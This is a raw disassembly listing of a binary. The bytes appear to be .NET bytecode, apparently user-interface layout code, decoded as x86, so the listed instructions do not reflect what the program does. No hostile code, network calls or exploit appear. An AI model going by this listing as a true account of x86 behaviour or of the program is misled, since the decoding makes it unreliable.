  402fff:	7b 2f                	jnp    0x403030
  403001:	00 00                	add    %al,(%eax)
  403003:	04 72                	add    $0x72,%al
  403005:	01 00                	add    %eax,(%eax)
  403007:	00 70 6f             	add    %dh,0x6f(%eax)
  40300a:	30 00                	xor    %al,(%eax)
  40300c:	00 0a                	add    %cl,(%edx)
  40300e:	02 28                	add    (%eax),%ch
  403010:	39 00                	cmp    %eax,(%eax)
  403012:	00 0a                	add    %cl,(%edx)
  403014:	03 7b 2f             	add    0x2f(%ebx),%edi
  403017:	00 00                	add    %al,(%eax)
  403019:	04 6f                	add    $0x6f,%al
  40301b:	3a 00                	cmp    (%eax),%al
  40301d:	00 0a                	add    %cl,(%edx)
  40301f:	03 73 2d             	add    0x2d(%ebx),%esi
  403022:	00 00                	add    %al,(%eax)
  403024:	0a 7d 30             	or     0x30(%ebp),%bh
  403027:	00 00                	add    %al,(%eax)
  403029:	04 03                	add    $0x3,%al
  40302b:	7b 30                	jnp    0x40305d
  40302d:	00 00                	add    %al,(%eax)
  40302f:	04 1f                	add    $0x1f,%al
  403031:	19 6f 86             	sbb    %ebp,-0x7a(%edi)
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 03                	or     (%ebx),%al
  403038:	7b 30                	jnp    0x40306a
  40303a:	00 00                	add    %al,(%eax)
  40303c:	04 1f                	add    $0x1f,%al
  40303e:	68 04 5a 1f 1a       	push   $0x1a1f5a04
  403043:	58                   	pop    %eax
  403044:	6f                   	outsl  %ds:(%esi),(%dx)
  403045:	87 00                	xchg   %eax,(%eax)
  403047:	00 0a                	add    %cl,(%edx)
  403049:	03 7b 30             	add    0x30(%ebx),%edi
  40304c:	00 00                	add    %al,(%eax)
  40304e:	04 20                	add    $0x20,%al
  403050:	f8                   	clc
  403051:	02 00                	add    (%eax),%al
  403053:	00 6f 5a             	add    %ch,0x5a(%edi)
  403056:	00 00                	add    %al,(%eax)
  403058:	0a 03                	or     (%ebx),%al
  40305a:	7b 30                	jnp    0x40308c
  40305c:	00 00                	add    %al,(%eax)
  40305e:	04 1f                	add    $0x1f,%al
  403060:	10 6f 59             	adc    %ch,0x59(%edi)
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 03                	or     (%ebx),%al
  403067:	7b 30                	jnp    0x403099
  403069:	00 00                	add    %al,(%eax)
  40306b:	04 72                	add    $0x72,%al
  40306d:	01 00                	add    %eax,(%eax)
  40306f:	00 70 6f             	add    %dh,0x6f(%eax)
  403072:	30 00                	xor    %al,(%eax)
  403074:	00 0a                	add    %cl,(%edx)
  403076:	02 28                	add    (%eax),%ch
  403078:	39 00                	cmp    %eax,(%eax)
  40307a:	00 0a                	add    %cl,(%edx)
  40307c:	03 7b 30             	add    0x30(%ebx),%edi
  40307f:	00 00                	add    %al,(%eax)
  403081:	04 6f                	add    $0x6f,%al
  403083:	3a 00                	cmp    (%eax),%al
  403085:	00 0a                	add    %cl,(%edx)
  403087:	03 73 8b             	add    -0x75(%ebx),%esi
  40308a:	00 00                	add    %al,(%eax)
  40308c:	0a 7d 31             	or     0x31(%ebp),%bh
  40308f:	00 00                	add    %al,(%eax)
  403091:	04 03                	add    $0x3,%al
  403093:	7b 31                	jnp    0x4030c6
  403095:	00 00                	add    %al,(%eax)
  403097:	04 16                	add    $0x16,%al
  403099:	6f                   	outsl  %ds:(%esi),(%dx)
  40309a:	84 00                	test   %al,(%eax)
  40309c:	00 0a                	add    %cl,(%edx)
  40309e:	03 7b 31             	add    0x31(%ebx),%edi
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	04 16                	add    $0x16,%al
  4030a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a6:	8c 00                	mov    %es,(%eax)
  4030a8:	00 0a                	add    %cl,(%edx)
  4030aa:	03 7b 31             	add    0x31(%ebx),%edi
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	04 02                	add    $0x2,%al
  4030b1:	02 7b 29             	add    0x29(%ebx),%bh
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	04 28                	add    $0x28,%al
  4030b8:	2c 00                	sub    $0x0,%al
  4030ba:	00 06                	add    %al,(%esi)
  4030bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bd:	8d 00                	lea    (%eax),%eax
  4030bf:	00 0a                	add    %cl,(%edx)
  4030c1:	03 7b 36             	add    0x36(%ebx),%edi
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	04 1f                	add    $0x1f,%al
  4030c8:	0f 2f 3a             	comiss (%edx),%xmm7
  4030cb:	03 7b 31             	add    0x31(%ebx),%edi
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	04 20                	add    $0x20,%al
  4030d2:	e4 02                	in     $0x2,%al
  4030d4:	00 00                	add    %al,(%eax)
  4030d6:	1f                   	pop    %ds
  4030d7:	1e                   	push   %ds
  4030d8:	03 7b 36             	add    0x36(%ebx),%edi
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	04 5a                	add    $0x5a,%al
  4030df:	59                   	pop    %ecx
  4030e0:	1f                   	pop    %ds
  4030e1:	14 73                	adc    $0x73,%al
  4030e3:	36 00 00             	add    %al,%ss:(%eax)
  4030e6:	0a 6f 8e             	or     -0x72(%edi),%ch
  4030e9:	00 00                	add    %al,(%eax)
  4030eb:	0a 03                	or     (%ebx),%al
  4030ed:	7b 31                	jnp    0x403120
  4030ef:	00 00                	add    %al,(%eax)
  4030f1:	04 1f                	add    $0x1f,%al
  4030f3:	19 1f                	sbb    %ebx,(%edi)
  4030f5:	1e                   	push   %ds
  4030f6:	03 7b 36             	add    0x36(%ebx),%edi
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	04 5a                	add    $0x5a,%al
  4030fd:	58                   	pop    %eax
  4030fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ff:	86 00                	xchg   %al,(%eax)
  403101:	00 0a                	add    %cl,(%edx)
  403103:	2b 27                	sub    (%edi),%esp
  403105:	03 7b 31             	add    0x31(%ebx),%edi
  403108:	00 00                	add    %al,(%eax)
  40310a:	04 20                	add    $0x20,%al
  40310c:	22 01                	and    (%ecx),%al
  40310e:	00 00                	add    %al,(%eax)
  403110:	1f                   	pop    %ds
  403111:	14 73                	adc    $0x73,%al
  403113:	36 00 00             	add    %al,%ss:(%eax)
  403116:	0a 6f 8e             	or     -0x72(%edi),%ch
  403119:	00 00                	add    %al,(%eax)
  40311b:	0a 03                	or     (%ebx),%al
  40311d:	7b 31                	jnp    0x403150
  40311f:	00 00                	add    %al,(%eax)
  403121:	04 20                	add    $0x20,%al
  403123:	db 01                	fildl  (%ecx)
  403125:	00 00                	add    %al,(%eax)
  403127:	6f                   	outsl  %ds:(%esi),(%dx)
  403128:	86 00                	xchg   %al,(%eax)
  40312a:	00 0a                	add    %cl,(%edx)
  40312c:	03 7b 31             	add    0x31(%ebx),%edi
  40312f:	00 00                	add    %al,(%eax)
  403131:	04 1f                	add    $0x1f,%al
  403133:	68 04 5a 1f 2f       	push   $0x2f1f5a04
  403138:	58                   	pop    %eax
  403139:	6f                   	outsl  %ds:(%esi),(%dx)
  40313a:	87 00                	xchg   %eax,(%eax)
  40313c:	00 0a                	add    %cl,(%edx)
  40313e:	02 28                	add    (%eax),%ch
  403140:	39 00                	cmp    %eax,(%eax)
  403142:	00 0a                	add    %cl,(%edx)
  403144:	03 7b 31             	add    0x31(%ebx),%edi
  403147:	00 00                	add    %al,(%eax)
  403149:	04 6f                	add    $0x6f,%al
  40314b:	3a 00                	cmp    (%eax),%al
  40314d:	00 0a                	add    %cl,(%edx)
  40314f:	03 73 2d             	add    0x2d(%ebx),%esi
  403152:	00 00                	add    %al,(%eax)
  403154:	0a 7d 32             	or     0x32(%ebp),%bh
  403157:	00 00                	add    %al,(%eax)
  403159:	04 03                	add    $0x3,%al
  40315b:	7b 32                	jnp    0x40318f
  40315d:	00 00                	add    %al,(%eax)
  40315f:	04 1b                	add    $0x1b,%al
  403161:	6f                   	outsl  %ds:(%esi),(%dx)
  403162:	86 00                	xchg   %al,(%eax)
  403164:	00 0a                	add    %cl,(%edx)
  403166:	03 7b 32             	add    0x32(%ebx),%edi
  403169:	00 00                	add    %al,(%eax)
  40316b:	04 1f                	add    $0x1f,%al
  40316d:	68 04 5a 1f 48       	push   $0x481f5a04
  403172:	58                   	pop    %eax
  403173:	6f                   	outsl  %ds:(%esi),(%dx)
  403174:	87 00                	xchg   %eax,(%eax)
  403176:	00 0a                	add    %cl,(%edx)
  403178:	03 7b 32             	add    0x32(%ebx),%edi
  40317b:	00 00                	add    %al,(%eax)
  40317d:	04 20                	add    $0x20,%al
  40317f:	0c 03                	or     $0x3,%al
  403181:	00 00                	add    %al,(%eax)
  403183:	6f                   	outsl  %ds:(%esi),(%dx)
  403184:	5a                   	pop    %edx
  403185:	00 00                	add    %al,(%eax)
  403187:	0a 03                	or     (%ebx),%al
  403189:	7b 32                	jnp    0x4031bd
  40318b:	00 00                	add    %al,(%eax)
  40318d:	04 1f                	add    $0x1f,%al
  40318f:	10 6f 59             	adc    %ch,0x59(%edi)
  403192:	00 00                	add    %al,(%eax)
  403194:	0a 03                	or     (%ebx),%al
  403196:	7b 32                	jnp    0x4031ca
  403198:	00 00                	add    %al,(%eax)
  40319a:	04 72                	add    $0x72,%al
  40319c:	01 00                	add    %eax,(%eax)
  40319e:	00 70 6f             	add    %dh,0x6f(%eax)
  4031a1:	30 00                	xor    %al,(%eax)
  4031a3:	00 0a                	add    %cl,(%edx)
  4031a5:	02 28                	add    (%eax),%ch
  4031a7:	39 00                	cmp    %eax,(%eax)
  4031a9:	00 0a                	add    %cl,(%edx)
  4031ab:	03 7b 32             	add    0x32(%ebx),%edi
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	04 6f                	add    $0x6f,%al
  4031b2:	3a 00                	cmp    (%eax),%al
  4031b4:	00 0a                	add    %cl,(%edx)
  4031b6:	03 73 2d             	add    0x2d(%ebx),%esi
  4031b9:	00 00                	add    %al,(%eax)
  4031bb:	0a 7d 33             	or     0x33(%ebp),%bh
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	04 03                	add    $0x3,%al
  4031c2:	7b 33                	jnp    0x4031f7
  4031c4:	00 00                	add    %al,(%eax)
  4031c6:	04 1f                	add    $0x1f,%al
  4031c8:	19 6f 86             	sbb    %ebp,-0x7a(%edi)
  4031cb:	00 00                	add    %al,(%eax)
  4031cd:	0a 03                	or     (%ebx),%al
  4031cf:	7b 33                	jnp    0x403204
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	04 1f                	add    $0x1f,%al
  4031d5:	68 04 5a 1f 58       	push   $0x581f5a04
  4031da:	58                   	pop    %eax
  4031db:	6f                   	outsl  %ds:(%esi),(%dx)
  4031dc:	87 00                	xchg   %eax,(%eax)
  4031de:	00 0a                	add    %cl,(%edx)
  4031e0:	03 7b 33             	add    0x33(%ebx),%edi
  4031e3:	00 00                	add    %al,(%eax)
  4031e5:	04 20                	add    $0x20,%al
  4031e7:	f8                   	clc
  4031e8:	02 00                	add    (%eax),%al
  4031ea:	00 6f 5a             	add    %ch,0x5a(%edi)
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a 03                	or     (%ebx),%al
  4031f1:	7b 33                	jnp    0x403226
  4031f3:	00 00                	add    %al,(%eax)
  4031f5:	04 1f                	add    $0x1f,%al
  4031f7:	10 6f 59             	adc    %ch,0x59(%edi)
  4031fa:	00 00                	add    %al,(%eax)
  4031fc:	0a 03                	or     (%ebx),%al
  4031fe:	7b 33                	jnp    0x403233
  403200:	00 00                	add    %al,(%eax)
  403202:	04 72                	add    $0x72,%al
  403204:	01 00                	add    %eax,(%eax)
  403206:	00 70 6f             	add    %dh,0x6f(%eax)
  403209:	30 00                	xor    %al,(%eax)
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	02 28                	add    (%eax),%ch
  40320f:	39 00                	cmp    %eax,(%eax)
  403211:	00 0a                	add    %cl,(%edx)
  403213:	03 7b 33             	add    0x33(%ebx),%edi
  403216:	00 00                	add    %al,(%eax)
  403218:	04 6f                	add    $0x6f,%al
  40321a:	3a 00                	cmp    (%eax),%al
  40321c:	00 0a                	add    %cl,(%edx)
  40321e:	2a 32                	sub    (%edx),%dh
  403220:	02 7b 2e             	add    0x2e(%ebx),%bh
  403223:	00 00                	add    %al,(%eax)
  403225:	04 6f                	add    $0x6f,%al
  403227:	8f 00                	pop    (%eax)
  403229:	00 0a                	add    %cl,(%edx)
  40322b:	2a e2                	sub    %dl,%ah
  40322d:	02 19                	add    (%ecx),%bl
  40322f:	7d 29                	jge    0x40325a
  403231:	00 00                	add    %al,(%eax)
  403233:	04 02                	add    $0x2,%al
  403235:	73 90                	jae    0x4031c7
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40323c:	00 00                	add    %al,(%eax)
  40323e:	04 02                	add    $0x2,%al
  403240:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  403245:	04 02                	add    $0x2,%al
  403247:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  40324c:	04 02                	add    $0x2,%al
  40324e:	73 91                	jae    0x4031e1
  403250:	00 00                	add    %al,(%eax)
  403252:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403255:	00 00                	add    %al,(%eax)
  403257:	04 02                	add    $0x2,%al
  403259:	28 18                	sub    %bl,(%eax)
  40325b:	00 00                	add    %al,(%eax)
  40325d:	0a 02                	or     (%edx),%al
  40325f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  403265:	fe 02                	incb   (%edx)
  403267:	19 7d 29             	sbb    %edi,0x29(%ebp)
  40326a:	00 00                	add    %al,(%eax)
  40326c:	04 02                	add    $0x2,%al
  40326e:	73 90                	jae    0x403200
  403270:	00 00                	add    %al,(%eax)
  403272:	0a 7d 2a             	or     0x2a(%ebp),%bh
  403275:	00 00                	add    %al,(%eax)
  403277:	04 02                	add    $0x2,%al
  403279:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  40327e:	04 02                	add    $0x2,%al
  403280:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  403285:	04 02                	add    $0x2,%al
  403287:	73 91                	jae    0x40321a
  403289:	00 00                	add    %al,(%eax)
  40328b:	0a 7d 2e             	or     0x2e(%ebp),%bh
  40328e:	00 00                	add    %al,(%eax)
  403290:	04 02                	add    $0x2,%al
  403292:	28 18                	sub    %bl,(%eax)
  403294:	00 00                	add    %al,(%eax)
  403296:	0a 02                	or     (%edx),%al
  403298:	03 7d 29             	add    0x29(%ebp),%edi
  40329b:	00 00                	add    %al,(%eax)
  40329d:	04 02                	add    $0x2,%al
  40329f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  4032a5:	00 00                	add    %al,(%eax)
  4032a7:	00 13                	add    %dl,(%ebx)
  4032a9:	30 06                	xor    %al,(%esi)
  4032ab:	00 3a                	add    %bh,(%edx)
  4032ad:	08 00                	or     %al,(%eax)
  4032af:	00 0a                	add    %cl,(%edx)
  4032b1:	00 00                	add    %al,(%eax)
  4032b3:	11 03                	adc    %eax,(%ebx)
  4032b5:	2d 01 2a 15 0a       	sub    $0xa152a01,%eax
  4032ba:	16                   	push   %ss
  4032bb:	0b 2b                	or     (%ebx),%ebp
  4032bd:	21 02                	and    %eax,(%edx)
  4032bf:	7b 2e                	jnp    0x4032ef
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	04 07                	add    $0x7,%al
  4032c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c6:	83 00 00             	addl   $0x0,(%eax)
  4032c9:	0a 7b 34             	or     0x34(%ebx),%bh
  4032cc:	00 00                	add    %al,(%eax)
  4032ce:	04 03                	add    $0x3,%al
  4032d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d1:	92                   	xchg   %eax,%edx
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	0a 33                	or     (%ebx),%dh
  4032d6:	04 07                	add    $0x7,%al
  4032d8:	0a 2b                	or     (%ebx),%ch
  4032da:	12 07                	adc    (%edi),%al
  4032dc:	17                   	pop    %ss
  4032dd:	58                   	pop    %eax
  4032de:	0b 07                	or     (%edi),%eax
  4032e0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	04 6f                	add    $0x6f,%al
  4032e7:	8f 00                	pop    (%eax)
  4032e9:	00 0a                	add    %cl,(%edx)
  4032eb:	32 d1                	xor    %cl,%dl
  4032ed:	03 6f 93             	add    -0x6d(%edi),%ebp
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	0a 17                	or     (%edi),%dl
  4032f4:	40                   	inc    %eax
  4032f5:	c1 02 00             	roll   $0x0,(%edx)
  4032f8:	00 06                	add    %al,(%esi)
  4032fa:	16                   	push   %ss
  4032fb:	3f                   	aas
  4032fc:	16                   	push   %ss
  4032fd:	01 00                	add    %eax,(%eax)
  4032ff:	00 02                	add    %al,(%edx)
  403301:	7b 2b                	jnp    0x40332e
  403303:	00 00                	add    %al,(%eax)
  403305:	04 06                	add    $0x6,%al
  403307:	33 07                	xor    (%edi),%eax
  403309:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  40330f:	04 02                	add    $0x2,%al
  403311:	28 39                	sub    %bh,(%ecx)
  403313:	00 00                	add    %al,(%eax)
  403315:	0a 02                	or     (%edx),%al
  403317:	7b 2e                	jnp    0x403347
  403319:	00 00                	add    %al,(%eax)
  40331b:	04 06                	add    $0x6,%al
  40331d:	6f                   	outsl  %ds:(%esi),(%dx)
  40331e:	83 00 00             	addl   $0x0,(%eax)
  403321:	0a 7b 2f             	or     0x2f(%ebx),%bh
  403324:	00 00                	add    %al,(%eax)
  403326:	04 6f                	add    $0x6f,%al
  403328:	94                   	xchg   %eax,%esp
  403329:	00 00                	add    %al,(%eax)
  40332b:	0a 02                	or     (%edx),%al
  40332d:	28 39                	sub    %bh,(%ecx)
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 02                	or     (%edx),%al
  403333:	7b 2e                	jnp    0x403363
  403335:	00 00                	add    %al,(%eax)
  403337:	04 06                	add    $0x6,%al
  403339:	6f                   	outsl  %ds:(%esi),(%dx)
  40333a:	83 00 00             	addl   $0x0,(%eax)
  40333d:	0a 7b 30             	or     0x30(%ebx),%bh
  403340:	00 00                	add    %al,(%eax)
  403342:	04 6f                	add    $0x6f,%al
  403344:	94                   	xchg   %eax,%esp
  403345:	00 00                	add    %al,(%eax)
  403347:	0a 02                	or     (%edx),%al
  403349:	28 39                	sub    %bh,(%ecx)
  40334b:	00 00                	add    %al,(%eax)
  40334d:	0a 02                	or     (%edx),%al
  40334f:	7b 2e                	jnp    0x40337f
  403351:	00 00                	add    %al,(%eax)
  403353:	04 06                	add    $0x6,%al
  403355:	6f                   	outsl  %ds:(%esi),(%dx)
  403356:	83 00 00             	addl   $0x0,(%eax)
  403359:	0a 7b 31             	or     0x31(%ebx),%bh
  40335c:	00 00                	add    %al,(%eax)
  40335e:	04 6f                	add    $0x6f,%al
  403360:	94                   	xchg   %eax,%esp
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 02                	or     (%edx),%al
  403365:	28 39                	sub    %bh,(%ecx)
  403367:	00 00                	add    %al,(%eax)
  403369:	0a 02                	or     (%edx),%al
  40336b:	7b 2e                	jnp    0x40339b
  40336d:	00 00                	add    %al,(%eax)
  40336f:	04 06                	add    $0x6,%al
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	83 00 00             	addl   $0x0,(%eax)
  403375:	0a 7b 32             	or     0x32(%ebx),%bh
  403378:	00 00                	add    %al,(%eax)
  40337a:	04 6f                	add    $0x6f,%al
  40337c:	94                   	xchg   %eax,%esp
  40337d:	00 00                	add    %al,(%eax)
  40337f:	0a 02                	or     (%edx),%al
  403381:	28 39                	sub    %bh,(%ecx)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a 02                	or     (%edx),%al
  403387:	7b 2e                	jnp    0x4033b7
  403389:	00 00                	add    %al,(%eax)
  40338b:	04 06                	add    $0x6,%al
  40338d:	6f                   	outsl  %ds:(%esi),(%dx)
  40338e:	83 00 00             	addl   $0x0,(%eax)
  403391:	0a 7b 33             	or     0x33(%ebx),%bh
  403394:	00 00                	add    %al,(%eax)
  403396:	04 6f                	add    $0x6f,%al
  403398:	94                   	xchg   %eax,%esp
  403399:	00 00                	add    %al,(%eax)
  40339b:	0a 02                	or     (%edx),%al
  40339d:	7b 2e                	jnp    0x4033cd
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	04 06                	add    $0x6,%al
  4033a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a4:	83 00 00             	addl   $0x0,(%eax)
  4033a7:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	04 6f                	add    $0x6f,%al
  4033ae:	95                   	xchg   %eax,%ebp
  4033af:	00 00                	add    %al,(%eax)
  4033b1:	0a 02                	or     (%edx),%al
  4033b3:	7b 2e                	jnp    0x4033e3
  4033b5:	00 00                	add    %al,(%eax)
  4033b7:	04 06                	add    $0x6,%al
  4033b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ba:	83 00 00             	addl   $0x0,(%eax)
  4033bd:	0a 7b 30             	or     0x30(%ebx),%bh
  4033c0:	00 00                	add    %al,(%eax)
  4033c2:	04 6f                	add    $0x6f,%al
  4033c4:	95                   	xchg   %eax,%ebp
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	0a 02                	or     (%edx),%al
  4033c9:	7b 2e                	jnp    0x4033f9
  4033cb:	00 00                	add    %al,(%eax)
  4033cd:	04 06                	add    $0x6,%al
  4033cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d0:	83 00 00             	addl   $0x0,(%eax)
  4033d3:	0a 7b 31             	or     0x31(%ebx),%bh
  4033d6:	00 00                	add    %al,(%eax)
  4033d8:	04 6f                	add    $0x6f,%al
  4033da:	95                   	xchg   %eax,%ebp
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	0a 02                	or     (%edx),%al
  4033df:	7b 2e                	jnp    0x40340f
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	04 06                	add    $0x6,%al
  4033e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e6:	83 00 00             	addl   $0x0,(%eax)
  4033e9:	0a 7b 32             	or     0x32(%ebx),%bh
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	04 6f                	add    $0x6f,%al
  4033f0:	95                   	xchg   %eax,%ebp
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	0a 02                	or     (%edx),%al
  4033f5:	7b 2e                	jnp    0x403425
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	04 06                	add    $0x6,%al
  4033fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4033fc:	83 00 00             	addl   $0x0,(%eax)
  4033ff:	0a 7b 33             	or     0x33(%ebx),%bh
  403402:	00 00                	add    %al,(%eax)
  403404:	04 6f                	add    $0x6f,%al
  403406:	95                   	xchg   %eax,%ebp
  403407:	00 00                	add    %al,(%eax)
  403409:	0a 02                	or     (%edx),%al
  40340b:	7b 2e                	jnp    0x40343b
  40340d:	00 00                	add    %al,(%eax)
  40340f:	04 06                	add    $0x6,%al
  403411:	6f                   	outsl  %ds:(%esi),(%dx)
  403412:	96                   	xchg   %eax,%esi
  403413:	00 00                	add    %al,(%eax)
  403415:	0a 02                	or     (%edx),%al
  403417:	7b 2e                	jnp    0x403447
  403419:	00 00                	add    %al,(%eax)
  40341b:	04 6f                	add    $0x6f,%al
  40341d:	8f 00                	pop    (%eax)
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	2d 1d 02 7b 2a       	sub    $0x2a7b021d,%eax
  403426:	00 00                	add    %al,(%eax)
  403428:	04 6f                	add    $0x6f,%al
  40342a:	97                   	xchg   %eax,%edi
  40342b:	00 00                	add    %al,(%eax)
  40342d:	0a 02                	or     (%edx),%al
  40342f:	7b 2a                	jnp    0x40345b
  403431:	00 00                	add    %al,(%eax)
  403433:	04 6f                	add    $0x6f,%al
  403435:	95                   	xchg   %eax,%ebp
  403436:	00 00                	add    %al,(%eax)
  403438:	0a 02                	or     (%edx),%al
  40343a:	28 17                	sub    %dl,(%edi)
  40343c:	00 00                	add    %al,(%eax)
  40343e:	0a 2a                	or     (%edx),%ch
  403440:	06                   	push   %es
  403441:	16                   	push   %ss
  403442:	2f                   	das
  403443:	01 2a                	add    %ebp,(%edx)
  403445:	06                   	push   %es
  403446:	0c 38                	or     $0x38,%al
  403448:	95                   	xchg   %eax,%ebp
  403449:	00 00                	add    %al,(%eax)
  40344b:	00 02                	add    %al,(%edx)
  40344d:	7b 2e                	jnp    0x40347d
  40344f:	00 00                	add    %al,(%eax)
  403451:	04 08                	add    $0x8,%al
  403453:	6f                   	outsl  %ds:(%esi),(%dx)
  403454:	83 00 00             	addl   $0x0,(%eax)
  403457:	0a 7b 2f             	or     0x2f(%ebx),%bh
  40345a:	00 00                	add    %al,(%eax)
  40345c:	04 1f                	add    $0x1f,%al
  40345e:	68 08 5a 1f 0a       	push   $0xa1f5a08
  403463:	58                   	pop    %eax
  403464:	6f                   	outsl  %ds:(%esi),(%dx)
  403465:	87 00                	xchg   %eax,(%eax)
  403467:	00 0a                	add    %cl,(%edx)
  403469:	02 7b 2e             	add    0x2e(%ebx),%bh
  40346c:	00 00                	add    %al,(%eax)
  40346e:	04 08                	add    $0x8,%al
  403470:	6f                   	outsl  %ds:(%esi),(%dx)
  403471:	83 00 00             	addl   $0x0,(%eax)
  403474:	0a 7b 30             	or     0x30(%ebx),%bh
  403477:	00 00                	add    %al,(%eax)
  403479:	04 1f                	add    $0x1f,%al
  40347b:	68 08 5a 1f 1a       	push   $0x1a1f5a08
  403480:	58                   	pop    %eax
  403481:	6f                   	outsl  %ds:(%esi),(%dx)
  403482:	87 00                	xchg   %eax,(%eax)
  403484:	00 0a                	add    %cl,(%edx)
  403486:	02 7b 2e             	add    0x2e(%ebx),%bh
  403489:	00 00                	add    %al,(%eax)
  40348b:	04 08                	add    $0x8,%al
  40348d:	6f                   	outsl  %ds:(%esi),(%dx)
  40348e:	83 00 00             	addl   $0x0,(%eax)
  403491:	0a 7b 31             	or     0x31(%ebx),%bh
  403494:	00 00                	add    %al,(%eax)
  403496:	04 1f                	add    $0x1f,%al
  403498:	68 08 5a 1f 2f       	push   $0x2f1f5a08
  40349d:	58                   	pop    %eax
  40349e:	6f                   	outsl  %ds:(%esi),(%dx)
  40349f:	87 00                	xchg   %eax,(%eax)
  4034a1:	00 0a                	add    %cl,(%edx)
  4034a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	04 08                	add    $0x8,%al
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	83 00 00             	addl   $0x0,(%eax)
  4034ae:	0a 7b 32             	or     0x32(%ebx),%bh
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	04 1f                	add    $0x1f,%al
  4034b5:	68 08 5a 1f 48       	push   $0x481f5a08
  4034ba:	58                   	pop    %eax
  4034bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bc:	87 00                	xchg   %eax,(%eax)
  4034be:	00 0a                	add    %cl,(%edx)
  4034c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034c3:	00 00                	add    %al,(%eax)
  4034c5:	04 08                	add    $0x8,%al
  4034c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c8:	83 00 00             	addl   $0x0,(%eax)
  4034cb:	0a 7b 33             	or     0x33(%ebx),%bh
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 1f                	add    $0x1f,%al
  4034d2:	68 08 5a 1f 58       	push   $0x581f5a08
  4034d7:	58                   	pop    %eax
  4034d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d9:	87 00                	xchg   %eax,(%eax)
  4034db:	00 0a                	add    %cl,(%edx)
  4034dd:	08 17                	or     %dl,(%edi)
  4034df:	58                   	pop    %eax
  4034e0:	0c 08                	or     $0x8,%al
  4034e2:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034e5:	00 00                	add    %al,(%eax)
  4034e7:	04 6f                	add    $0x6f,%al
  4034e9:	8f 00                	pop    (%eax)
  4034eb:	00 0a                	add    %cl,(%edx)
  4034ed:	3f                   	aas
  4034ee:	5a                   	pop    %edx
  4034ef:	ff                   	(bad)
  4034f0:	ff                   	(bad)
  4034f1:	ff 1f                	lcall  *(%edi)
  4034f3:	68 02 7b 2e 00       	push   $0x2e7b02
  4034f8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4034fb:	8f 00                	pop    (%eax)
  4034fd:	00 0a                	add    %cl,(%edx)
  4034ff:	5a                   	pop    %edx
  403500:	1f                   	pop    %ds
  403501:	2b 58 02             	sub    0x2(%eax),%ebx
  403504:	28 33                	sub    %dh,(%ebx)
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 34             	or     0x34(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 13                	or     (%ebx),%dl
  40350f:	0a 12                	or     (%edx),%dl
  403511:	0a 28                	or     (%eax),%ch
  403513:	98                   	cwtl
  403514:	00 00                	add    %al,(%eax)
  403516:	0a 30                	or     (%eax),%dh
  403518:	5d                   	pop    %ebp
  403519:	02 1f                	add    (%edi),%bl
  40351b:	68 02 7b 2e 00       	push   $0x2e7b02
  403520:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403523:	8f 00                	pop    (%eax)
  403525:	00 0a                	add    %cl,(%edx)
  403527:	5a                   	pop    %edx
  403528:	1f                   	pop    %ds
